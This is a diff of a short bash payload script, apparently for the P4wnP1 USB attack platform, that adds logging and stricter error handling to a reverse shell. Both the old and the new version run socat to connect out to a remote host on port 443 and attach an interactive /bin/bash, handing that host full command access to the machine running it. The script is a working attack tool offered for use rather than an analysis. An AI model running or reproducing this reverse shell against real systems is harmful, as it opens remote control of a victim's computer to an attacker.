@@ -1,27 +1,32 @@
-# payloads/network/reverse_shell_tunnel.sh
-######################################
+#!/bin/bash
+# /opt/p4wnp1/payloads/network/reverse_shell_tunnel.sh
+# Description: Reverse shell using socat to remote host and port
 
-### Description: Reverse shell to remote listener (socat or bash+nc)
-### Requirements: socat (recommended), or netcat
+set -euo pipefail
 
+# === Config ===
 PAYLOAD_NAME="reverse_shell_tunnel"
 LOG_DIR="/opt/p4wnp1/logs"
+LOG_FILE="$LOG_DIR/${PAYLOAD_NAME}.log"
 REMOTE_HOST="10.13.37.1"
 REMOTE_PORT="443"
 
 mkdir -p "$LOG_DIR"
+exec > >(tee -a "$LOG_FILE") 2>&1
 
-pkill socat || true
+echo "[*] Starting reverse shell tunnel to $REMOTE_HOST:$REMOTE_PORT at $(date)"
 
-# Check if socat is installed
-if ! command -v socat &> /dev/null; then
-  echo "[!] socat not found. Install with: sudo apt install socat"
+# === Check socat availability ===
+if ! command -v socat >/dev/null 2>&1; then
+  echo "[!] socat not found. Install it with: sudo apt install socat"
   exit 1
 fi
 
-# Start reverse shell
-socat TCP:$REMOTE_HOST:$REMOTE_PORT EXEC:/bin/bash,pty,stderr,setsid,sigint,sane > "$LOG_DIR/${PAYLOAD_NAME}.log" 2>&1 &
+# === Kill old instances ===
+pkill -f "socat TCP:$REMOTE_HOST:$REMOTE_PORT" || true
+sleep 1
 
-echo "[+] Reverse shell initiated to $REMOTE_HOST:$REMOTE_PORT. Logs in $LOG_DIR/${PAYLOAD_NAME}.log"
+# === Start socat reverse shell ===
+socat TCP:"$REMOTE_HOST":"$REMOTE_PORT" EXEC:/bin/bash,pty,stderr,setsid,sigint,sane > "$LOG_FILE" 2>&1 &
 
-exit 0
+echo "[✓] Reverse shell initiated to $REMOTE_HOST:$REMOTE_PORT"
